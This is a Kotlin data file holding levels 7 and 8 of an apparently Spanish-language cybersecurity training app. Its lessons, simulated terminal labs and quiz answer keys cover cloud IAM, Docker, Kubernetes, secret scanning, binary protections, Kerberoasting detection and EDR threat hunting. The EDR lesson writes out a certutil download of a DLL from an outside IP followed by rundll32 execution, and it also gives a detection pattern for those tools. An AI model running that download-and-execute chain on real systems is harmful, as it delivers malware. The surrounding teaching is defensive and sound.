package com.example.data.curriculum

import com.example.data.model.CliLabScenario
import com.example.data.model.CurriculumLevel
import com.example.data.model.CurriculumTopic
import com.example.data.model.QuizQuestion
import com.example.data.model.TheorySection

object CurriculumLevels7To8 {

    val level7Arquitecto = CurriculumLevel(
        number = 7,
        rankName = "Arquitecto",
        title = "Nivel 7: Arquitecto",
        subtitle = "Seguridad en la Nube, Docker, Kubernetes y DevSecOps",
        badgeCode = "NIVEL 7",
        description = "Domina la seguridad de las grandes empresas tecnológicas: permisos IAM en la nube, contenedores Docker seguros, clústeres Kubernetes y automatización DevSecOps.",
        syllabusHighlights = listOf(
            "Permisos IAM en la Nube y el peligro de los comodines (*)",
            "Seguridad en Contenedores Docker (prohibido usar root)",
            "Control de accesos RBAC y redes en Kubernetes",
            "Caza de contraseñas filtradas en repositorios Git (Gitleaks)",
            "Auditoría automática de Infraestructura en la Nube (Terraform)"
        ),
        topics = listOf(
            CurriculumTopic(
                id = "l7_t1",
                levelNumber = 7,
                orderIndex = 1,
                code = "CLASE 7.1",
                title = "Permisos Cloud IAM",
                durationMinutes = 7,
                xpReward = 265,
                summary = "Aprende cómo se controlan los permisos en la nube (AWS, Azure, GCP) y por qué poner un asterisco (*) puede entregar toda la empresa a un atacante.",
                subtopicsChecklist = listOf(
                    "¿Qué es IAM en la nube?",
                    "El peligro mortal de poner Action: '*' y Resource: '*'",
                    "Auditar una política JSON de la nube"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "La Llave Maestra de la Nube: Políticas IAM",
                        body = "En la nube, los permisos se escriben en archivos JSON llamados **Políticas IAM**. La regla de oro es dar solo el permiso exacto que necesita cada servidor.\n\nSi alguien escribe un asterisco `\"*\"` en `Action` y `Resource`, le está dando superpoderes sobre toda la cuenta en la nube.",
                        codeSnippet = "\"Effect\": \"Allow\",\n\"Action\": \"*\",     ◄── ¡Peligro! Permite hacer de todo\n\"Resource\": \"*\"    ◄── ¡En todos los servidores!",
                        keyTakeaway = "Nunca uses comodines '*' generales en producción; especifica cada servicio y recurso concreto."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Audita la Política de la Nube",
                    briefing = "Revisa el archivo `iam_role_policy.json` ejecutando `cat iam_role_policy.json` para encontrar el permiso excesivo.",
                    initialBanner = listOf(
                        "AUDITOR DE SEGURIDAD CLOUD IAM",
                        "Política bajo revisión: iam_role_policy.json"
                    ),
                    quickChips = listOf("cat iam_role_policy.json", "help"),
                    hint = "Toca el chip 'cat iam_role_policy.json' y pulsa Ejecutar.",
                    acceptedCommands = listOf("cat iam_role_policy.json", "grep -n '\"\\*\"' iam_role_policy.json"),
                    requiredTokens = listOf("iam_role_policy.json"),
                    successOutput = listOf(
                        "\"Effect\": \"Allow\",",
                        "\"Action\": [\"s3:GetObject\", \"iam:CreatePolicyVersion\", \"*\"],",
                        "\"Resource\": \"*\"",
                        "[!] ¡Fallo crítico detectado! El comodín '*' otorga control total de la nube."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l7_t1_1",
                        question = "En una política IAM de la nube, ¿qué riesgo tiene asignar `\"Action\": \"*\"` y `\"Resource\": \"*\"`?",
                        options = listOf(
                            "Otorga permisos de administrador total sobre todos los servicios y recursos de la nube",
                            "Hace que el servidor sea más seguro",
                            "Bloquea todos los accesos",
                            "Solo permite leer archivos de texto"
                        ),
                        correctIndex = 0,
                        explanation = "El comodín '*' significa 'todos', entregando control absoluto de la infraestructura cloud."
                    )
                )
            ),
            CurriculumTopic(
                id = "l7_t2",
                levelNumber = 7,
                orderIndex = 2,
                code = "CLASE 7.2",
                title = "Docker Seguro",
                durationMinutes = 7,
                xpReward = 270,
                summary = "Descubre cómo blindar contenedores Docker para que no corran como root ni guarden contraseñas en su receta (Dockerfile).",
                subtopicsChecklist = listOf(
                    "Por qué un contenedor Docker no debe correr como USER root",
                    "Nunca escribir contraseñas dentro del Dockerfile",
                    "Auditar un Dockerfile con Trivy"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Blindando Contenedores Docker",
                        body = "Los contenedores Docker empaquetan aplicaciones listas para correr. Pero por defecto, el contenedor se ejecuta como `root`.\n\nEn el archivo `Dockerfile`, debemos crear siempre un usuario normal (`USER appuser`) y jamás escribir contraseñas fijas en líneas `ENV`.",
                        codeSnippet = "# Mal:\nENV DB_PASSWORD=\"Secreto123\"\nUSER root\n\n# Bien:\nUSER appuser",
                        keyTakeaway = "Ejecutar contenedores sin privilegios de root evita que un fallo en la app comprometa todo el servidor anfitrión."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Encuentra los Fallos del Dockerfile",
                    briefing = "Inspecciona el archivo `Dockerfile` ejecutando `cat Dockerfile`.",
                    initialBanner = listOf(
                        "ESCÁNER DE CONTENEDORES DOCKER",
                        "Archivo: Dockerfile"
                    ),
                    quickChips = listOf("cat Dockerfile", "trivy config Dockerfile"),
                    hint = "Toca el chip 'cat Dockerfile' y presiona Ejecutar.",
                    acceptedCommands = listOf("cat dockerfile", "trivy config dockerfile"),
                    requiredTokens = listOf("dockerfile"),
                    successOutput = listOf(
                        "FROM ubuntu:latest",
                        "ENV DB_PASSWORD=\"ProdSecret#2026\"",
                        "RUN chmod 777 /app",
                        "USER root",
                        "[!] ¡4 errores críticos detectados en el Dockerfile!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l7_t2_1",
                        question = "¿Qué instrucción se debe añadir al final de un `Dockerfile` seguro para evitar que el contenedor corra como superusuario `root`?",
                        options = listOf("USER appuser (un usuario sin privilegios)", "USER root", "chmod 777 /", "EXPOSE 23"),
                        correctIndex = 0,
                        explanation = "Definir un usuario sin privilegios con la directiva USER protege al servidor host en caso de intrusión."
                    )
                )
            ),
            CurriculumTopic(
                id = "l7_t3",
                levelNumber = 7,
                orderIndex = 3,
                code = "CLASE 7.3",
                title = "Clúster Kubernetes",
                durationMinutes = 7,
                xpReward = 275,
                summary = "Aprende a verificar qué permisos tiene un contenedor dentro de un clúster de Kubernetes usando kubectl.",
                subtopicsChecklist = listOf(
                    "¿Qué es Kubernetes (K8s)? El director de orquesta de los contenedores",
                    "Revisar permisos internos con kubectl auth can-i --list",
                    "Por qué un contenedor no debería poder leer todos los secretos del clúster"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Vigilando los Permisos en Kubernetes",
                        body = "Kubernetes administra cientos de contenedores (llamados Pods). Si un Pod tiene permisos excesivos, un atacante que entre en él podrá leer todas las contraseñas del clúster (`secrets`).\n\nCon el comando `kubectl auth can-i --list` comprobamos al instante qué tiene permitido hacer el Pod actual.",
                        codeSnippet = "$ kubectl auth can-i --list\nsecrets   [get list watch]  ◄── ¡Peligro! Puede leer todas las claves",
                        keyTakeaway = "Aplica mínimo privilegio en Kubernetes para que cada aplicación solo acceda a lo que estrictamente necesita."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Audita los Permisos del Clúster",
                    briefing = "Lista los permisos activos en Kubernetes ejecutando `kubectl auth can-i --list`.",
                    initialBanner = listOf(
                        "AUDITOR KUBERNETES RBAC",
                        "Clúster: prod-cluster"
                    ),
                    quickChips = listOf("kubectl auth can-i --list", "kubectl get pods"),
                    hint = "Toca el chip 'kubectl auth can-i --list' y pulsa Ejecutar.",
                    acceptedCommands = listOf("kubectl auth can-i --list", "kubectl get pods"),
                    requiredTokens = listOf("kubectl"),
                    successOutput = listOf(
                        "Resources    Verbs",
                        "secrets      [get list watch]",
                        "pods/exec    [create get]",
                        "[!] ¡Alerta! Este Pod tiene permiso para leer todos los 'secrets' del clúster."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l7_t3_1",
                        question = "¿Qué comando de Kubernetes permite consultar la lista de acciones y recursos a los que tiene acceso tu sesión actual?",
                        options = listOf("kubectl auth can-i --list", "ping 127.0.0.1", "clear", "whoami"),
                        correctIndex = 0,
                        explanation = "kubectl auth can-i --list interroga al servidor API de Kubernetes sobre tus permisos RBAC."
                    )
                )
            ),
            CurriculumTopic(
                id = "l7_t4",
                levelNumber = 7,
                orderIndex = 4,
                code = "CLASE 7.4",
                title = "Secretos en Git",
                durationMinutes = 7,
                xpReward = 270,
                summary = "Usa herramientas DevSecOps (Gitleaks) para detectar si un programador subió por error una llave secreta al historial de código Git.",
                subtopicsChecklist = listOf(
                    "Por qué borrar una contraseña en un nuevo commit NO la borra del historial de Git",
                    "Escaneo automático de repositorios con Gitleaks",
                    "Rotación inmediata de claves filtradas"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Cazando Llaves Olvidadas en el Historial de Git",
                        body = "Uno de los accidentes más comunes ocurre cuando un programador sube su código a Git con una llave de acceso adentro. Aunque luego la borre en otro cambio, **la llave queda grabada para siempre en el historial de Git**.\n\nCon **Gitleaks**, escaneamos toda la historia del proyecto en segundos para detectar cualquier llave filtrada.",
                        codeSnippet = "$ gitleaks detect --source .\nFinding: AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI...\"\nFile:    src/config/aws_client.js:14",
                        keyTakeaway = "Si una clave aparece en el historial de Git, debes anularla (revocarla) y crear una nueva de inmediato."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Escanea el Repositorio con Gitleaks",
                    briefing = "Busca contraseñas ocultas en el historial del código ejecutando `gitleaks detect --source .`.",
                    initialBanner = listOf(
                        "ESCÁNER DEVSECOPS GITLEAKS",
                        "Repositorio: /workspace/microservice-auth"
                    ),
                    quickChips = listOf("gitleaks detect --source .", "git log -p -n 2"),
                    hint = "Toca el chip 'gitleaks detect --source .' y presiona Ejecutar.",
                    acceptedCommands = listOf("gitleaks detect --source .", "git log -p -n 2"),
                    requiredTokens = listOf("git"),
                    successOutput = listOf(
                        "Finding: AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCY\"",
                        "File:    src/config/aws_client.js:14",
                        "[!] ¡Secreto detectado en el historial de Git! Requiere rotación inmediata."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l7_t4_1",
                        question = "Si subes por accidente una contraseña a un repositorio Git y luego haces otro commit borrándola, ¿la contraseña desaparece por completo?",
                        options = listOf(
                            "No, sigue guardada en el historial de versiones de Git, por lo que debe revocarse y cambiarse de inmediato",
                            "Sí, desaparece por arte de magia",
                            "Solo se ve de noche",
                            "El repositorio se autodestruye"
                        ),
                        correctIndex = 0,
                        explanation = "Git conserva todos los commits pasados en su historial, por lo que cualquier credencial subida queda comprometida."
                    )
                )
            ),
            CurriculumTopic(
                id = "l7_t5",
                levelNumber = 7,
                orderIndex = 5,
                code = "CLASE 7.5",
                title = "Auditoría Terraform",
                durationMinutes = 8,
                xpReward = 280,
                summary = "Audita plantillas de infraestructura en la nube con Checkov antes de que salgan a producción y gradúate de Arquitecto.",
                subtopicsChecklist = listOf(
                    "¿Qué es la Infraestructura como Código (Terraform)?",
                    "Detectar puertos abiertos a todo el mundo (0.0.0.0/0) y discos sin cifrar",
                    "Escaneo preventivo con Checkov"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Frenando Errores en la Nube antes de Crearlos",
                        body = "Con **Terraform**, los ingenieros crean servidores en la nube escribiendo un archivo llamado `main.tf`.\n\nUsando el escáner **Checkov**, revisamos ese archivo antes de lanzarlo para impedir que alguien cree una base de datos sin cifrar o deje el puerto 22 abierto a todo Internet (`0.0.0.0/0`).",
                        codeSnippet = "$ checkov -f main.tf\nFAILED: Puerto 22 abierto a 0.0.0.0/0\nFAILED: Base de datos RDS sin cifrado (storage_encrypted = false)",
                        keyTakeaway = "¡Supera este laboratorio para graduarte de Arquitecto y desbloquear el Nivel 8 final: Leyenda!"
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Audita la Plantilla Cloud con Checkov",
                    briefing = "Revisa la seguridad del archivo `main.tf` ejecutando `checkov -f main.tf`.",
                    initialBanner = listOf(
                        "VALIDADOR CLOUD CHECKOV",
                        "Plantilla: main.tf"
                    ),
                    quickChips = listOf("checkov -f main.tf", "cat main.tf"),
                    hint = "Toca el chip 'checkov -f main.tf' y pulsa Ejecutar.",
                    acceptedCommands = listOf("checkov -f main.tf", "cat main.tf"),
                    requiredTokens = listOf("main.tf"),
                    successOutput = listOf(
                        "Check: CKV_AWS_24: \"Ensure no security groups allow 0.0.0.0/0 to port 22\" -> FAILED",
                        "Check: CKV_AWS_16: \"Ensure RDS is encrypted at rest\" -> FAILED",
                        "[+] ¡Errores detectados a tiempo antes del despliegue! Nivel 7 completado."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l7_t5_1",
                        question = "¿Qué significa que una regla de seguridad en la nube permita el acceso desde `0.0.0.0/0` al puerto 22?",
                        options = listOf(
                            "Que cualquier dirección IP de todo Internet puede intentar conectarse a ese puerto",
                            "Que nadie puede conectarse",
                            "Que solo funciona sin cables",
                            "Que el puerto está cifrado"
                        ),
                        correctIndex = 0,
                        explanation = "0.0.0.0/0 abarca todas las direcciones IPv4 de Internet."
                    )
                )
            )
        )
    )

    val level8Leyenda = CurriculumLevel(
        number = 8,
        rankName = "Leyenda",
        title = "Nivel 8: Leyenda",
        subtitle = "Ingeniería Inversa, Binarios y Operaciones de Élite",
        badgeCode = "NIVEL 8",
        description = "El nivel máximo de Hackklin: ingeniería inversa de programas compilados, protecciones de memoria, defensa de élite contra Kerberoasting, caza EDR y Purple Team.",
        syllabusHighlights = listOf(
            "Ingeniería Inversa de programas con objdump",
            "Protecciones de memoria de un binario (Stack Canary, NX y PIE)",
            "Detección de ataques avanzados Kerberoasting en Active Directory",
            "Caza de amenazas avanzadas en telemetría EDR (LOLBins)",
            "Operaciones de Élite Purple Team y Matriz MITRE ATT&CK"
        ),
        topics = listOf(
            CurriculumTopic(
                id = "l8_t1",
                levelNumber = 8,
                orderIndex = 1,
                code = "CLASE 8.1",
                title = "Ingeniería Inversa",
                durationMinutes = 8,
                xpReward = 290,
                summary = "Aprende a desensamblar un programa compilado usando objdump para descubrir fallos de desbordamiento de memoria en su interior.",
                subtopicsChecklist = listOf(
                    "¿Qué es la Ingeniería Inversa de un binario?",
                    "Por qué la función strcpy es peligrosa al copiar datos sin medir el tamaño",
                    "Desensamblar un programa con objdump -d -M intel"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Viendo el Código Máquina con objdump",
                        body = "Cuando no tenemos el código fuente de un programa, los investigadores de vulnerabilidades usan **Ingeniería Inversa** para traducir el binario a instrucciones del procesador (ensamblador).\n\nSi al usar `objdump` vemos que el programa llama a funciones antiguas como `strcpy` o `gets` sobre un espacio pequeño de memoria, sabemos que sufre un Desbordamiento de Búfer (Buffer Overflow).",
                        codeSnippet = "$ objdump -d -M intel auth_daemon\nsub  rsp, 0x30             ; Reserva solo 48 bytes\ncall 401030 <strcpy@plt>   ; ¡Copia sin revisar si cabe!",
                        keyTakeaway = "En lenguajes como C/C++, siempre debe usarse copia segura con límite de longitud (como strncpy o snprintf)."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Desensambla el Binario con objdump",
                    briefing = "Inspecciona las instrucciones internas de `auth_daemon` ejecutando `objdump -d -M intel auth_daemon`.",
                    initialBanner = listOf(
                        "LABORATORIO DE INGENIERÍA INVERSA",
                        "Binario bajo análisis: auth_daemon"
                    ),
                    quickChips = listOf("objdump -d -M intel auth_daemon", "nm auth_daemon"),
                    hint = "Toca el chip 'objdump -d -M intel auth_daemon' y pulsa Ejecutar.",
                    acceptedCommands = listOf("objdump -d -m intel auth_daemon", "objdump -d auth_daemon", "nm auth_daemon"),
                    requiredTokens = listOf("auth_daemon"),
                    successOutput = listOf(
                        "0000000000401142 <verify_token>:",
                        "  401146:  sub    rsp,0x30",
                        "  40114e:  call   401030 <strcpy@plt>",
                        "[+] ¡Fallo descubierto! <verify_token> usa strcpy sin límite sobre un buffer de 48 bytes."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l8_t1_1",
                        question = "¿Por qué funciones clásicas como `gets()` o `strcpy()` en lenguaje C causan vulnerabilidades de Desbordamiento de Búfer (Buffer Overflow)?",
                        options = listOf(
                            "Porque copian los datos recibidos sin comprobar si superan el tamaño de la memoria reservada",
                            "Porque son demasiado lentas",
                            "Porque requieren conexión a Internet",
                            "Porque borran el archivo original"
                        ),
                        correctIndex = 0,
                        explanation = "Al no limitar el número de bytes copiados, permiten sobrescribir zonas adyacentes de la pila de memoria."
                    )
                )
            ),
            CurriculumTopic(
                id = "l8_t2",
                levelNumber = 8,
                orderIndex = 2,
                code = "CLASE 8.2",
                title = "Escudos de Memoria",
                durationMinutes = 8,
                xpReward = 295,
                summary = "Usa checksec para verificar si un programa tiene activados los escudos modernos contra exploits: Stack Canary, NX y PIE.",
                subtopicsChecklist = listOf(
                    "Stack Canary: El centinela que detecta si alguien desbordó la memoria",
                    "NX (No-Execute) y PIE/ASLR (Direcciones aleatorias)",
                    "Auditar un ejecutable con checksec"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Los 3 Escudos de un Programa Compilado",
                        body = "Para impedir que los hackers exploten fallos de memoria, existen tres escudos que se activan al crear un programa:\n\n• **Stack Canary**: Un valor centinela que aborta el programa si detecta un desbordamiento.\n• **NX**: Prohíbe ejecutar código inyectado en los datos.\n• **PIE / ASLR**: Cambia las direcciones de memoria al azar en cada arranque.",
                        codeSnippet = "$ checksec --file=auth_daemon\nSTACK CANARY: No canary found  ◄── ¡Sin centinela!\nNX:           NX enabled       ◄── Activo\nPIE:          No PIE           ◄── ¡Direcciones fijas!",
                        keyTakeaway = "Con el comando checksec comprobamos en un segundo si un binario fue compilado con todas sus defensas."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Audita los Escudos del Binario con checksec",
                    briefing = "Comprueba qué protecciones le faltan a `auth_daemon` ejecutando `checksec --file=auth_daemon`.",
                    initialBanner = listOf(
                        "AUDITOR DE MITIGACIONES DE MEMORIA",
                        "Binario: auth_daemon"
                    ),
                    quickChips = listOf("checksec --file=auth_daemon", "help"),
                    hint = "Toca el chip 'checksec --file=auth_daemon' y presiona Ejecutar.",
                    acceptedCommands = listOf("checksec --file=auth_daemon", "checksec auth_daemon"),
                    requiredTokens = listOf("auth_daemon"),
                    successOutput = listOf(
                        "RELRO          STACK CANARY     NX           PIE",
                        "Partial RELRO  No canary found  NX enabled   No PIE",
                        "[!] Diagnóstico: Faltan las protecciones Stack Canary y PIE."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l8_t2_1",
                        question = "¿Qué protección coloca un valor secreto en la pila de memoria para detectar de inmediato si ocurrió un desbordamiento antes de que el atacante tome control?",
                        options = listOf("Stack Canary", "Cable Ethernet", "Protector de pantalla", "Archivo ZIP"),
                        correctIndex = 0,
                        explanation = "El Stack Canary actúa como un canario en la mina: si su valor se altera por un overflow, el programa se detiene de forma segura."
                    )
                )
            ),
            CurriculumTopic(
                id = "l8_t3",
                levelNumber = 8,
                orderIndex = 3,
                code = "CLASE 8.3",
                title = "Caza Kerberoasting",
                durationMinutes = 8,
                xpReward = 300,
                summary = "Detecta uno de los ataques más famosos contra redes corporativas (Kerberoasting) cazando peticiones con cifrado débil 0x17.",
                subtopicsChecklist = listOf(
                    "¿Qué es el ataque Kerberoasting en Active Directory?",
                    "La señal de alarma: Event ID 4769 con cifrado débil RC4 (0x17)",
                    "Cómo neutralizarlo con cuentas gMSA y AES-256"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Detectando Kerberoasting en el Controlador de Dominio",
                        body = "En el ataque **Kerberoasting**, un intruso dentro de la red pide tickets de acceso (TGS) de servicios internos para llevárselos a su casa e intentar adivinar sus contraseñas por fuerza bruta.\n\n¿Cómo lo atrapamos? Buscando en el registro del servidor el **Event ID 4769** cuando pide cifrado antiguo `0x17` (RC4) en lugar de AES.",
                        codeSnippet = "[EventID=4769] Account=jdoe Service=mssql_svc Encryption=0x17  ◄── ¡Ataque!",
                        keyTakeaway = "Desactivar el cifrado RC4 (0x17) y usar cuentas automáticas gMSA detiene el Kerberoasting de raíz."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Atrapa el Ataque Kerberoasting en los Logs",
                    briefing = "Busca peticiones con cifrado `0x17` en `dc01_kerberos.log` ejecutando `grep 0x17 dc01_kerberos.log`.",
                    initialBanner = listOf(
                        "DEFENSA DE ÉLITE ACTIVE DIRECTORY",
                        "Registro Kerberos: dc01_kerberos.log"
                    ),
                    quickChips = listOf("grep 0x17 dc01_kerberos.log", "cat dc01_kerberos.log"),
                    hint = "Toca el chip 'grep 0x17 dc01_kerberos.log' y pulsa Ejecutar.",
                    acceptedCommands = listOf("grep 0x17 dc01_kerberos.log", "cat dc01_kerberos.log"),
                    requiredTokens = listOf("dc01_kerberos.log"),
                    successOutput = listOf(
                        "[EventID=4769] Account=jdoe Service=mssql_svc Encryption=0x17",
                        "[EventID=4769] Account=jdoe Service=iis_webapp Encryption=0x17",
                        "[!] ¡Ataque Kerberoasting detectado desde la cuenta 'jdoe'!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l8_t3_1",
                        question = "Al monitorear el evento 4769 de Kerberos, ¿qué código de tipo de cifrado alerta de un posible ataque de Kerberoasting por usar RC4 débil?",
                        options = listOf("0x17 (RC4-HMAC)", "HTTPS 443", "UTF-8", "IPv6"),
                        correctIndex = 0,
                        explanation = "El código 0x17 corresponde a RC4-HMAC, preferido por herramientas de ataque porque es mucho más rápido de crackear que AES (0x12)."
                    )
                )
            ),
            CurriculumTopic(
                id = "l8_t4",
                levelNumber = 8,
                orderIndex = 4,
                code = "CLASE 8.4",
                title = "Telemetría EDR",
                durationMinutes = 8,
                xpReward = 300,
                summary = "Aprende cómo los atacantes usan programas legítimos de Windows (LOLBins como certutil y rundll32) para intentar engañar al antivirus.",
                subtopicsChecklist = listOf(
                    "¿Qué son los LOLBins (Living-off-the-Land Binaries)?",
                    "La Pirámide del Dolor: Detectar el comportamiento del atacante",
                    "Cazar descargas furtivas con certutil en el EDR"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "Cuando el Atacante Usa Herramientas del Propio Windows",
                        body = "Para no hacer saltar el antivirus con un programa extraño, los hackers de élite usan herramientas que ya vienen instaladas en Windows (llamadas **LOLBins**), como `certutil.exe` o `rundll32.exe`.\n\nLos sistemas **EDR** modernos vigilan el comportamiento: si ven a `certutil.exe` descargando archivos de Internet (`-urlcache`), lanzan una alerta crítica.",
                        codeSnippet = "certutil.exe -urlcache -split -f https://198.51.100.77/stage2.dll\nrundll32.exe C:\\Users\\Public\\stage2.dll,StartWork",
                        keyTakeaway = "Detectar el comportamiento (TTPs) es la cima de la Pirámide del Dolor y lo más difícil de evadir para un hacker."
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Caza el Uso de LOLBins en el EDR",
                    briefing = "Filtra la telemetría `edr_telemetry.log` ejecutando el comando del primer chip.",
                    initialBanner = listOf(
                        "CONSOLA EDR DE CAZA DE AMENAZAS",
                        "Stream activo: edr_telemetry.log"
                    ),
                    quickChips = listOf("grep -E 'certutil|rundll32|mshta' edr_telemetry.log", "cat edr_telemetry.log"),
                    hint = "Toca el primer chip y presiona Ejecutar.",
                    acceptedCommands = listOf("grep -e 'certutil|rundll32|mshta' edr_telemetry.log", "cat edr_telemetry.log"),
                    requiredTokens = listOf("edr_telemetry.log"),
                    successOutput = listOf(
                        "[EDR-ALERT] Process=certutil.exe CommandLine=\"certutil.exe -urlcache -f https://198.51.100.77/stage2.dll\"",
                        "[EDR-ALERT] Process=rundll32.exe CommandLine=\"rundll32.exe stage2.dll,StartWork\"",
                        "[+] ¡Comportamiento malicioso con LOLBins cazado con éxito!"
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l8_t4_1",
                        question = "¿Cómo se les llama a los programas legítimos preinstalados en el sistema operativo (como `certutil` o `rundll32`) cuando un atacante los reutiliza para descargar o ejecutar código malicioso?",
                        options = listOf("LOLBins (Living-off-the-Land Binaries)", "Protectores de pantalla", "Drivers de audio", "Cookies web"),
                        correctIndex = 0,
                        explanation = "Los LOLBins son binarios nativos firmados por el fabricante del sistema operativo que los atacantes abusan para camuflar su actividad."
                    )
                )
            ),
            CurriculumTopic(
                id = "l8_t5",
                levelNumber = 8,
                orderIndex = 5,
                code = "CLASE 8.5",
                title = "Élite Purple Team",
                durationMinutes = 9,
                xpReward = 320,
                summary = "Une la fuerza ofensiva (Red Team) y defensiva (Blue Team) con la matriz mundial MITRE ATT&CK y gradúate con el rango máximo de Hacker / Leyenda.",
                subtopicsChecklist = listOf(
                    "¿Qué es la Matriz MITRE ATT&CK? La enciclopedia mundial de técnicas de hackeo",
                    "Purple Team: Atacantes éticos y defensores trabajando juntos en vivo",
                    "Certificación Final de los 8 Niveles de Hackklin"
                ),
                theorySections = listOf(
                    TheorySection(
                        heading = "La Cumbre: MITRE ATT&CK y Operaciones Purple Team",
                        body = "**MITRE ATT&CK** es el mapa mundial que cataloga todas las tácticas y técnicas reales que usan los grupos de hackers.\n\nEn una operación **Purple Team**, el equipo ofensivo (Red Team) simula cada técnica frente al equipo defensivo (Blue Team) para comprobar y perfeccionar todas las alarmas en tiempo real.",
                        codeSnippet = "Red Team (Simula el ataque) + Blue Team (Afina el escudo) ──► PURPLE TEAM DE ÉLITE",
                        keyTakeaway = "¡Ejecuta la auditoría final en la consola para conquistar el Nivel 8 y convertirte en Leyenda de Hackklin!"
                    )
                ),
                cliLab = CliLabScenario(
                    missionTitle = "Graduación Final: Verifica la Matriz MITRE ATT&CK",
                    briefing = "Ejecuta el comando maestro `hackklin-audit --verify-mitre-coverage` para certificar tu dominio de los 8 niveles.",
                    initialBanner = listOf(
                        "CENTRO DE OPERACIONES DE ÉLITE HACKKLIN",
                        "Certificación Final de Rango: LEYENDA / HACKER"
                    ),
                    quickChips = listOf("hackklin-audit --verify-mitre-coverage", "cat mitre_matrix_status.txt"),
                    hint = "Toca el chip 'hackklin-audit --verify-mitre-coverage' y presiona Ejecutar.",
                    acceptedCommands = listOf("hackklin-audit --verify-mitre-coverage", "cat mitre_matrix_status.txt"),
                    requiredTokens = listOf("mitre"),
                    successOutput = listOf(
                        "[OK] TA0001 Initial Access       | Cobertura: 100%",
                        "[OK] TA0004 Privilege Escalation | Cobertura: 100%",
                        "[OK] TA0006 Credential Access    | Cobertura: 100%",
                        "[OK] TA0008 Lateral Movement     | Cobertura: 100%",
                        "[+] ¡FELICITACIONES! Has completado los 8 niveles desde cero hasta Leyenda."
                    )
                ),
                quizQuestions = listOf(
                    QuizQuestion(
                        id = "q_l8_t5_1",
                        question = "¿Cómo se denomina al equipo y metodología donde el Red Team (ofensivo) y el Blue Team (defensivo) colaboran en conjunto usando MITRE ATT&CK para mejorar la detección real?",
                        options = listOf("Purple Team", "Equipo desconectado", "Soporte de impresoras", "Modo avión"),
                        correctIndex = 0,
                        explanation = "El Purple Team combina el Rojo (ofensiva) y el Azul (defensiva) para maximizar la resiliencia de toda la organización."
                    )
                )
            )
        )
    )
}
